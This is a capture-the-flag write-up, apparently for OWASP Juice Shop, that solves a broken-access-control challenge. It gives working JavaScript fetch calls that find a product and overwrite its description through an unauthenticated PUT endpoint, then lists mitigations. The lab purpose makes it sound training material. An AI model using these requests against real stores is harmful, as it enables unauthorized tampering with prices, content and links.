# Product Tampering

## Category
Broken Access Control — Difficulty: ⭐⭐⭐

## Description

Change the href of the link within the OWASP SSL Advanced Forensic Tool (O-Saft) product description to https://owasp.slack.com.

## Vulnerability

The `/api/Products/:id` endpoint allows unauthenticated PUT requests to modify product data. There is no authorization check to prevent users from modifying product descriptions.

## Steps

1. Find the O-Saft product ID via the API:

```javascript
fetch('/api/Products/').then(r=>r.json()).then(d=>console.log(d.data.find(p=>p.name.includes('O-Saft'))))
```

2. Product ID is 9. Send a PUT request with the modified description:

```javascript
fetch('/api/Products/9', {
  method: 'PUT',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    description: 'O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href="https://owasp.slack.com" target="_blank">More...</a>'
  })
}).then(r=>r.json()).then(console.log)
```

3. The link in the product description now points to https://owasp.slack.com.

## Impact

An attacker can modify product descriptions, prices, or other data without authentication, leading to misinformation or financial damage.

## Mitigation

- Require authentication and authorization for all write operations
- Validate and sanitize all input data
- Implement proper access controls on API endpoints
